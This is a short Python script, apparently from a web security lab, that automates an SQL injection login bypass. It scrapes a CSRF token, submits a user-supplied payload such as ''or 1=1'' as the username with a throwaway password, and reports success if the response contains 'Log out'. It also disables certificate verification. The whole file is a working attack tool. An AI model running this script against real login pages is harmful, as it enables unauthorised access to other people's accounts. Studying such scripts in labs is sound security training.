import requests
import urllib3
from bs4 import BeautifulSoup
import sys

#Hide warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

#Var
Url = input("Target url: ").strip()
Payload = input("Payload: ").strip()
Session = requests.Session()


#B1: Lấy trang Login để lấy CSRF token


def getCtf(Url, Session):
    resp = Session.get(Url)
    #print(resp.text)
    soup = BeautifulSoup(resp.text, "html.parser")
    #Take csrf token
    csrf_token = soup.find("input", {"name": "csrf"})["value"]
    #print(f"CSRF is {csrf_token}")
    return csrf_token

def exploit_bypass(url, payload, Session):
    csrf_token = getCtf(url,Session)
    data = {
        "csrf": csrf_token,
        "username": payload,
        "password": "Random"
    }
    response = Session.post(url, data=data, verify=False, proxies=proxies)
    print(f"Status: {response.status_code}")
    #print(response.text)
    #soup = BeautifulSoup(response.text, "html.parser")
    if "Log out" in response.text:
        return True
    else:
        return False

if __name__ == '__main__':
    #print(getCtf(Url))
    try:
        if exploit_bypass(Url, Payload,Session):
            print(f"{Url} have sqli with payload = {Payload}")
        else:
            print(f"{Url} dont' have sqli")
    except IndexError:
        print(f"[-]Usage: {sys.argv[0]} <url> <payload> ")
        print(f"[-]Example: {sys.argv[0]} URL:example.com, payload: 'or 1=1' ")
        sys.exit(-1)